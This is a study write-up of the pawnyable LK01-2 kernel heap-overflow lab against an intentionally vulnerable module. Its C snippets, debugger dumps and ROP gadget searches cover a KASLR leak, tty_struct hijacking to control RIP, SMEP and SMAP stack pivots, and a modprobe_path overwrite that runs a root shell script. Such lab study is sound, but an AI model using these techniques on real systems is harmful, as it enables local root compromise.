# Heap Overflow

Practice from [1].

[1] https://pawnyable.cafe/linux-kernel/LK01/heap_overflow.html

## size of tty_struct

~~~
[cpey@nuc linux]$ pahole -E --hex -C tty_struct vmlinux | tail
                }entry; /* 0x2a0  0x10 */
                /* typedef work_func_t */ void               (*func)(struct work_struct *); /* 0x2b0   0x8 */
        }SAK_work; /* 0x298  0x20 */
        struct tty_port *          port;                                                 /* 0x2b8   0x8 */

        /* size: 704, cachelines: 11, members: 47 */
        /* sum members: 664, holes: 4, sum holes: 16 */
        /* sum bitfield members: 128 bits, bit holes: 4, sum bit holes: 64 bits */
};
~~~

## ptmx_open


~~~c
File: drivers/tty/pty.c

static int ptmx_open(struct inode *inode, struct file *filp)
{
	...
	struct tty_struct *tty;
	...
	mutex_lock(&tty_mutex);
	tty = tty_init_dev(ptm_driver, index);
	/* The tty returned here is locked so we can safely
	   drop the mutex */
	mutex_unlock(&tty_mutex);
	...
~~~

### module_write

~~~
/ # cat /proc/modules
vuln 16384 0 - Live 0xffffffffc0002000 (O)
/ # grep module_write /proc/kallsyms
ffffffffc00021f9 t module_write [vuln]
~~~

`g_buf` address:

~~~
   0xffffffffc0002209    mov    qword ptr [rbp - 0x50], rdx
   0xffffffffc000220d    mov    qword ptr [rbp - 0x58], rcx
   0xffffffffc0002211    mov    rdi, 0xffffffffc00030ee
   0xffffffffc0002218    call   0xffffffff8160100a            <0xffffffff8160100a>

   0xffffffffc000221d    mov    rax, qword ptr [rip + 0x21dc]
 ► 0xffffffffc0002224    mov    qword ptr [rbp - 8], rax
   0xffffffffc0002228    mov    rax, qword ptr [rbp - 0x48]
   0xffffffffc000222c    mov    qword ptr [rbp - 0x10], rax
   0xffffffffc0002230    mov    rax, qword ptr [rbp - 0x50]
   0xffffffffc0002234    mov    qword ptr [rbp - 0x18], rax
   0xffffffffc0002238    mov    rax, qword ptr [rbp - 8]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i r $rax
rax            0xffff888002fcac00  -131391589405696
~~~

### g_buf

~~~
pwndbg> x/4xg 0xffff888002fcac00
0xffff888002fcac00:     0x0000000000000000      0x0000000000000000
0xffff888002fcac10:     0x0000000000000000      0x0000000000000000
~~~

### tty_struct

~~~
pwndbg> x/4xg 0xffff888002fcac00 + 0x400
0xffff888002fcb000:     0x0000000100005401      0x0000000000000000
0xffff888002fcb010:     0xffff88800265be40      0xffffffff81c38880
pwndbg> x/4xg 0xffff888002fcac00 + 0x400*2
0xffff888002fcb400:     0x0000000100005401      0x0000000000000000
0xffff888002fcb410:     0xffff88800265bf00      0xffffffff81c38760
pwndbg> x/4xg 0xffff888002fcac00 - 0x400
0xffff888002fca800:     0x0000000100005401      0x0000000000000000
0xffff888002fca810:     0xffff88800265bf00      0xffffffff81c38760
pwndbg> x/4xg 0xffff888002fcac00 - 0x400*2
0xffff888002fca400:     0x0000000100005401      0x0000000000000000
0xffff888002fca410:     0xffff88800265be40      0xffffffff81c38880
~~~

## Using radare2: Finding the address after the copy

~~~
[cpey@nuc LK01-2]$ r2 -A ./fs/rootfs_updated/root/vuln.ko -B 0xffffffffc0002000
...
[0x08000094]> iS
[Sections]

nth paddr        size vaddr               vsize perm type     name
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x08000000            0x0 ---- NULL
1   0x00000040   0x24 0xffffffffc0002040   0x24 -r-- NOTE     .note.gnu.build-id
2   0x00000064   0x30 0xffffffffc0002064   0x30 -r-- NOTE     .note.Linux
3   0x00000094  0x360 0xffffffffc0002094  0x360 -r-x PROGBITS .text
~~~

Any addresses need to be subtracted of 0x94.

~~~
[0xffffffffc0002285]> is~module_write
29  0x0000028d 0xffffffffc000228d LOCAL  FUNC   309      module_write
[0xffffffffc0002285]> s 0xffffffffc000228d
~~~

~~~
[0xffffffffc000228d [xAdvc]0 1% 310 ./fs/rootfs_updated/root/vuln.ko]> pd $r @ sym.module_write
┌ 309: sym.module_write (int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4);
...
│           0xffffffffc000228d      55             push rbp
│           0xffffffffc000228e      4889e5         mov rbp, rsp
│           0xffffffffc0002291      4883ec58       sub rsp, 0x58
│           0xffffffffc0002295      48897dc0       mov qword [var_40h], rdi    ; arg1
│           0xffffffffc0002299      488975b8       mov qword [var_48h], rsi    ; arg2
│           0xffffffffc000229d      488955b0       mov qword [var_50h], rdx    ; arg3
│           0xffffffffc00022a1      48894da8       mov qword [var_58h], rcx    ; arg4
│           0xffffffffc00022a5      48c7c7000000.  mov rdi, 0          ; int64_t arg1
│           0xffffffffc00022ac      e800000000     call 0xffffffffc00022b1 ;[1]
│           ; CALL XREF from sym.module_write @ 0xffffffffc00022ac(x)
│           0xffffffffc00022b1      488b05000000.  mov rax, qword [0xffffffffc00022b8]
~~~

* `module_write` address:
~~~
> ? 0xffffffffc00022b8 - 0x94
hex     0xffffffffc0002224
~~~

* Address after the `copy_to_user`:

~~~
│       │   0xffffffffc0002383      488b55e8       mov rdx, qword [var_18h]    ; int64_t arg3
│       │   0xffffffffc0002387      488b4df0       mov rcx, qword [var_10h]    ; int64_t arg4
│       │   0xffffffffc000238b      488b45f8       mov rax, qword [var_8h]
│       │   0xffffffffc000238f      4889ce         mov rsi, rcx        ; int64_t arg2
│       │   0xffffffffc0002392      4889c7         mov rdi, rax        ; int64_t arg1
│       │   0xffffffffc0002395      e800000000     call 0xffffffffc000239a ;[2]
│       │   ; CALL XREF from sym.module_write @ 0xffffffffc0002395(x)
│       │   0xffffffffc000239a      488945e8       mov qword [var_18h], rax
> ? 0xffffffffc000239a - 0x94
hex     0xffffffffc0002306
~~~

## Heap memory after the copy

~~~
 ► 0xffffffffc0002306    mov    qword ptr [rbp - 0x18], rax
   0xffffffffc000230a    mov    rax, qword ptr [rbp - 0x18]
   0xffffffffc000230e    test   rax, rax
   0xffffffffc0002311    je     0xffffffffc0002328            <0xffffffffc0002328>
    ↓
   0xffffffffc0002328    mov    rax, qword ptr [rbp - 0x50]
   0xffffffffc000232c    leave
   0xffffffffc000232d    ret
    ↓
   0xffffffff8114a125    mov    r13, rax
   0xffffffff8114a128    test   r13, r13
   0xffffffff8114a12b    jg     0xffffffff8114a16a            <0xffffffff8114a16a>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/4xg 0xffff888002fcac00
0xffff888002fcac00:     0x4141414141414141      0x4141414141414141
0xffff888002fcac10:     0x4141414141414141      0x4141414141414141
pwndbg> x/4xg 0xffff888002fcac00 + 0x400
0xffff888002fcb000:     0x4141414141414141      0x4141414141414141
0xffff888002fcb010:     0x4141414141414141      0x4141414141414141
pwndbg> x/4xg 0xffff888002fcac00 + 0x400*2
0xffff888002fcb400:     0x0000000100005401      0x0000000000000000
0xffff888002fcb410:     0xffff88800265bf00      0xffffffff81c38760
pwndbg> x/4xg 0xffff888002fcac00 + 0x4FB
0xffff888002fcb0fb:     0xfcb0f84141414141      0x000000ffff888002
0xffff888002fcb10b:     0x0000bf0000000000      0x1c03000000000000
pwndbg> x/4xg 0xffff888002fcac00 + 0x4FE
0xffff888002fcb0fe:     0x888002fcb0f84141      0x000000000000ffff
0xffff888002fcb10e:     0x0000000000bf0000      0x04157f1c03000000
~~~

# Bypassing KASLR

## struct tty_struct


`tty_operations` pointer at offset 0x18:

~~~
[cpey@nuc linux]$ pahole -E --hex -C tty_struct vmlinux
struct tty_struct {
        int                        magic;                                                /*     0   0x4 */
        struct kref {
                /* typedef refcount_t */ struct refcount_struct {
                        /* typedef atomic_t */ struct {
                                int counter;                                             /*   0x4   0x4 */
                        } refs; /*   0x4   0x4 */
                } refcount; /*   0x4   0x4 */
        }kref; /*   0x4   0x4 */
        struct device *            dev;                                                  /*   0x8   0x8 */
        struct tty_driver *        driver;                                               /*  0x10   0x8 */
        const struct tty_operations  * ops;                                              /*  0x18   0x8 */
...
~~~

Is found in the heap memory sprayed with `tty_struct`:

~~~
pwndbg> x/4xg 0xffff888002fcac00 + 0x400
0xffff888002fcb000:     0x0000000100005401      0x0000000000000000
0xffff888002fcb010:     0xffff88800265be40      0xffffffff81c38880
~~~

Offset of `tty_operations` pointer: 0xffffffff81c38880 - 0xffffffff81000000 = 0xc38880

This pointer can be read by the buffer overflow in `module_read`:

~~~c
  fd = open("/dev/holstein", O_RDWR);
  ...
  // KASLRの回避
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);
~~~

# Controlling RIP

## Bypassing SMAP

Since SMAP is enabled, it is not possible to construct a fake `file_operations`
in userspace.

## Leaking the address of `g_buf`

`g_buf` is at: 0xffff888002fc4c00 (different location this time)

~~~
pwndbg> x/16xg 0xffff888002fc4c00 + 0x400
0xffff888002fc5000:     0x0000000100005401      0x0000000000000000
0xffff888002fc5010:     0xffff888002672e40      0xffffffff81c38880
0xffff888002fc5020:     0x0000000000000032      0x0000000000000000
0xffff888002fc5030:     0x0000000000000000      0xffff888002fc5038
0xffff888002fc5040:     0xffff888002fc5038      0xffff888002fc5048
0xffff888002fc5050:     0xffff888002fc5048      0xffff888002759c40
0xffff888002fc5060:     0x0000000000000000      0x0000000000000000
0xffff888002fc5070:     0xffff888002fc5070      0xffff888002fc5070
~~~

Pointers in `tty_struct`:

~~~
[cpey@nuc linux]$ pahole -E --hex -C tty_struct vmlinux
struct tty_struct {
...
                struct list_head {
                        struct list_head * next;                                         /*  0x38   0x8 */
                        /* --- cacheline 1 boundary (64 bytes) --- */
                        struct list_head * prev;                                         /*  0x40   0x8 */
                }read_wait; /*  0x38  0x10 */
...
~~~

`->next` pointer, points to the tty_struct (points to itself):

~~~
struct list_head *next: `g_buf` + 0x400 + 0x38 = 0xffff888002fc5038
g_buf: 0xffff888002fc5038 - 0x438 = 0xffff888002fc4c00
~~~

~~~c
  // g_buf address leak
  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);
~~~

## Obtaining RIP

Creates a fake `struct tty_operations` at `g_buf`, and points `->ops` of the victim tty_struct to it:

~~~c
  // write fake function table
  unsigned  long *p = (unsigned  long *)&buf;
  for (int i = 0; i < 0x40; i++) {
    *p++ = 0xffffffffdead0000 + (i << 8);
  }
  *(unsigned  long *)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // RIP control
  for ( int i = 0; i < 100 ; i++) {
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe) ;
  }
~~~

RIP is controlled by address pointed by `tty_struct` + 0xc => `g_buf` + 0x0c

~~~
/ # ./control-rip
[+] kbase = 0xffffffff81000000
[+] g_buf = 0xffff888002fccc00
BUG: unable to handle page fault for address: ffffffffdead0c00
#PF: supervisor instruction fetch in kernel mode
#PF: error_code(0x0010) - not-present page
PGD 1e0d067 P4D 1e0d067 PUD 1e0f067 PMD 0
Oops: 0010 [#1] SMP PTI
CPU: 0 PID: 66 Comm: control-rip Tainted: G           O      5.15.0 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-1.fc38 04/01/2014
RIP: 0010:0xffffffffdead0c00  <--
~~~

# Bypassing SMEP: Stack Pivot

Use the following gadget:

~~~
[cpey@nuc 03.stack_pivot]$ ropr vmlinux --noisy --nosys --nojop -R "mov esp, 0x39000000; ret;"
0xffffffff815a9798: mov esp, 0x39000000; ret;
~~~

See: [src/03.stack_pivot](https://github.com/cpey/pawnyable/tree/main/LK01-2/src/03.stack_pivot)

# Bypassing SMAP: Stack Pivot to kernel heap

Need to assign `rsp` a heap address we can write to. From the crash caused by
`ioctl` (in [src/02.control-rip/control-rip.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/02.control-rip/control-rip.c)),

~~~c
  ioctl(spray[i], 0xdeadbeef, 0xcafebabe)
~~~

the following registers get overwritten:

~~~
RIP: 0010:0xffffffffdead0c00
Code: Unable to access opcode bytes at RIP 0xffffffffdead0bd6.
RSP: 0018:ffffc9000012fe10 EFLAGS: 00000286
RAX: ffffffffdead0c00 RBX: ffff888002fcd400 RCX: 00000000deadbeef
RDX: 00000000cafebabe RSI: 00000000deadbeef RDI: ffff888002fcd000
RBP: ffffc9000012fea8 R08: 00000000cafebabe R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000000 R12: 00000000deadbeef
R13: ffff888002fcd000 R14: 00000000cafebabe R15: ffff888002faf700
~~~

Difficult to find useful gadgets to assign `rsp` one of the registers we control the value of, such as:

~~~
[cpey@nuc 03.stack_pivot]$ ropr vmlinux --noisy --nosys --nojop -R "mov rsp, rcx; ret;"

==> Found 0 gadgets in 1.489 seconds
[cpey@nuc 03.stack_pivot]$ ropr vmlinux --noisy --nosys --nojop -R "mov rsp, rdx; ret;"

==> Found 0 gadgets in 1.476 seconds
~~~

Instead we will use:

~~~
[cpey@nuc 03.stack_pivot]$ ropr vmlinux --noisy --nosys --nojop -R "push rdx;.*pop rsp;.*ret;"
0xffffffff811cd945: push rdx; push 0x584a8348; adc [rbx+0x41], bl; pop rsp; pop rbp; ret;
0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;              <--
0xffffffff814decce: push rdx; add [rbx+0x41], bl; pop rsp; pop r13; pop rbp; ret;

==> Found 3 gadgets in 1.503 seconds
~~~

See: [src/04.heapbof-krop/heapbof-krop.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/04.heapbof-krop/heapbof-krop.c)

## Exploiting AAR/AAW

When not possible to pivot the stack, being rdx and ecx controllable, you can
write any 4-byte value to any address by calling this gadget:

~~~sh
$ ropr vmlinux --noisy --nosys --nojop -R "mov \[rdx\], rcx; ret;"
...
0xffffffff811b7dd6: mov [rdx], rcx; ret;
~~~

*Arbitary address writes (AAW)* primitives can be created in situations where RIP
can be controlled.

*Arbitrary address read (AAR)* can be created with:

~~~sh
$ ropr vmlinux --noisy --nosys --nojop -R "mov eax, \[rdx\]; ret;"
...
0xffffffff81440428: mov eax, [rdx]; ret;
~~~

### Attack vector

When the filetype of the executable is unknown, the following call path is
followed, which ends up invokin `/sbin/modprobe` and trying to load the binary
as a kernel module:

~~~
- do_execveat_common()
  - bprm_execve()
    - __request_module()
      - call_modprobe()    
~~~

Kernel code flow in [loading_kernel_module.md](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/05.heapbof-aaw/loading_kernel_module.md).

The objective is to replace the string "/sbin/modprobe" with the attacker's shellcode.

### Find address of string "/sbin/modprobe:

Searching the "/sbin/modprobe" string:

~~~sh
$ python3
>>> from ptrlib import ELF
>>> kernel = ELF("./vmlinux")
>>> hex(next(kernel.search("/sbin/modprobe\0")))
'0xffffffff81e38180'
~~~

Checking with gdb:

~~~gdb
pwndbg> x/1s 0xffffffff81e38180
0xffffffff81e38180:     "/sbin/modprobe"
~~~

### Using AAW

Overwritting "/sbin/modprobe" with the shellscript path using AAW primitive:

~~~c
void AAW32(unsigned long addr, unsigned int val) {
  unsigned long *p = (unsigned long*)&buf;
  p[12] = rop_mov_prdx_rcx; 	// mov qword [rdx], rcx; ret;
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // mov [rdx], rcx; ret;
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
  }
}

int main() {
...
  char cmd[] = "/tmp/evil.sh";
  for (int i = 0; i < sizeof(cmd); i += 4) {
    AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
  } 
}
~~~

### Prepare and trigger the shell script

~~~c
system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
system("chmod +x /tmp/evil.sh");
system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
system("chmod +x /tmp/pwn");
system("/tmp/pwn"); // call modprobe_path
~~~

See: [src/05.heapbof-aaw/heapbof-aaw.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/05.heapbof-aaw/heapbof-aaw.c)
